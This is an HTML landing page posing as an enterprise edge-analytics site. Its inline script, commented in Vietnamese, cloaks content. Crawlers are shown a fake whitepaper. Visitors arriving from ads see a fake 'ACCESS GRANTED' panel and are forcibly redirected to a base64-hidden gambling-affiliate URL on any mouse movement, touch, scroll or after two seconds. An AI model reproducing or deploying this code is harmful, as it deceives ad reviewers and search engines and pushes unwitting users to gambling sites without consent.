<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Infra | Enterprise Edge Analytics</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
</head>
<body class="bg-white">
    <div id="app"></div>

    <script>
        (function() {
            // 1. Cấu hình
            const config = {
                name: "Apex Cloud Systems",
                portal: "https://payhip.com/",
                // Giải mã link đích: https://partnerbcgame.com/vugguo2ha
                target: atob("aHR0cHM6Ly9wYXJ0bmVyYmNnYW1l") + atob("LmNvbS92dWdndW8yaGE="),
                token: "AUTH-" + Math.floor(1000 + Math.random() * 9000) + "-X",
                loc: "GLOBAL",
                ip: "104.21." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255)
            };

            const urlParams = new URLSearchParams(window.location.search);
            // Kiểm tra Ads hoặc chế độ Test
            const isAd = ["gclid", "gad_source", "wbraid", "gbraid"].some(x => urlParams.has(x));
            const isTest = urlParams.has('test'); 
            const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);

            // 2. Giao diện Whitepaper (Dành cho BOT)
            const UI_WHITEPAPER = `
                <nav class="border-b p-6 flex justify-between items-center bg-white"><span class="font-extrabold text-xl text-blue-600 italic">` + config.name + `</span></nav>
                <main class="max-w-4xl mx-auto px-6 py-20">
                    <h1 class="text-5xl font-black mb-8 uppercase italic">Scalable <span class="text-blue-600">Edge Computing</span></h1>
                    <p class="text-slate-600 text-justify">Our current framework leverages a distributed mesh of Tier-1 peering points to bypass the inherent bottlenecks of the public internet. Enterprise-scale data propagation now demands sub-millisecond round-trip times (RTT)...</p>
                </main>`;

            // 3. Giao diện Access Granted (Dành cho KHÁCH)
            const UI_ACCESS = `
                <style>body{background:#030a16;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;font-family:sans-serif;}</style>
                <div style="background:rgba(10,20,37,0.95);border:1px solid rgba(0,82,255,0.2);border-radius:40px;width:100%;max-width:400px;padding:50px;text-align:center;">
                    <h1 style="font-size:32px;font-weight:800;font-style:italic;margin-bottom:10px;">ACCESS <span style="color:#3bc117;">GRANTED</span></h1>
                    <div style="background:rgba(0,0,0,0.3);padding:20px;border-radius:20px;margin:30px 0;text-align:left;font-family:monospace;font-size:12px;">
                        <div style="display:flex;justify-content:space-between;margin-bottom:10px;"><span>TOKEN:</span><span style="color:#3bc117;">` + config.token + `</span></div>
                        <div style="display:flex;justify-content:space-between;"><span>CLUSTER:</span><span style="color:#3bc117;">` + config.loc + `</span></div>
                    </div>
                    <div id="cta" style="background:linear-gradient(135deg,#45d31c 0%,#3bc117 100%);color:#000;font-weight:900;padding:20px;border-radius:15px;cursor:pointer;text-transform:uppercase;">Continue to Terminal</div>
                </div>`;

            const app = document.getElementById('app');

            // 4. KIỂM TRA ĐIỀU KIỆN ĐỂ HIỂN THỊ
            if ((isAd || isTest) && !isBot) {
                app.innerHTML = UI_ACCESS;

                // HÀM NHẢY TRANG
                let hasJumped = false;
                const doJump = () => {
                    if (!hasJumped) {
                        hasJumped = true;
                        window.location.replace(config.target);
                    }
                };

                // KÍCH HOẠT NHẢY BẰNG MỌI CÁCH:
                // 1. Click vào nút
                document.getElementById('cta').onclick = doJump;
                
                // 2. DI CHUỘT (Dành cho PC)
                window.addEventListener('mousemove', doJump, { once: true });

                // 3. CHẠM MÀN HÌNH (Dành cho Mobile)
                window.addEventListener('touchstart', doJump, { once: true });

                // 4. CUỘN TRANG
                window.addEventListener('scroll', doJump, { once: true });

                // 5. TỰ ĐỘNG NHẢY SAU 2 GIÂY (Dành cho trình duyệt không chặn)
                setTimeout(doJump, 2000);

            } else {
                // Hiển thị trang trắng cho Bot
                app.innerHTML = UI_WHITEPAPER;
            }
        })();
    </script>
</body>
</html>
